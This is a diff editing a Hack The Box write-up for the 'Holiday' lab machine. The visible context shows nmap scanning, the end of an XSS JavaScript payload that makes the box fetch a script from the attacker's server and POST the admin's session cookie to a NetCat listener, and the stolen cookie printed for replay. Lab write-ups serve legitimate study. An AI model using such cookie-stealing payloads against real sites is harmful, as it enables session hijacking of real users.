@@ -39,6 +39,7 @@ Check for open ports with Nmap:
 ```text
 root@kali:~/htb/holiday# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.25 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 root@kali:~/htb/holiday# nmap -p$ports -v -sC -sV -oA holiday 10.10.10.25
+
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 12:26 BST
 Initiating Ping Scan at 12:26
 Scanning 10.10.10.25 [4 ports]
@@ -526,7 +527,7 @@ req2.setRequestHeader('Content-Type', 'text/plain');
 req2.send(params);
 ```
 
-Here we are getting the box to pull this script from our waiting web server on port 80, then POST a response back to a waiting NetCat listener on port 8000. The contents of that POST will contain URL a encoded page including the cookie of the admin service that runs every minute.
+Here we are getting the box to pull this script from our waiting web server on port 80, then POST a response back to a waiting NetCat listener on port 8000. The contents of that POST will contain a URL encoded page, which includes the cookie of the admin service that runs every minute.
 
 Get things set up on Kali, submit the note, and fingers crossed we get our response captured in a file. First we see a hit on the webserver:
 
@@ -579,7 +580,8 @@ Decodes to this:
 
 ```text
 <SNIP>
-<input type="hidden" name="cookie" value="connect.sid&#x3D;s%3A3aeeba40-b1a7-11ea-ad03-b74792d4303b.LnDoH7DEcRwKysftNhTHau7AtjawCJknIr1cMHOWCqY">\n                                      <input type="hidden" name="id" value="15">\n                                      <button class="button" type="submit">Approve</button>\n                                    </form>\n                            </div>\n                          </div>\n                        </div>\n                  </div>\n              </div>\n\n\n          </main>\n\n      </div>\n  </div>\n\n\n  </body>\n</html>\n'
+<input type="hidden" name="cookie" value="connect.sid&#x3D;s%3A3aeeba40-b1a7-11ea-ad03-b74792d4303b.LnDoH7DEcRwKysftNhTHau7AtjawCJknIr1cMHOWCqY">\n
+<SNIP>
 ```
 
 Use the cookie in the response above in Cookie Editor:
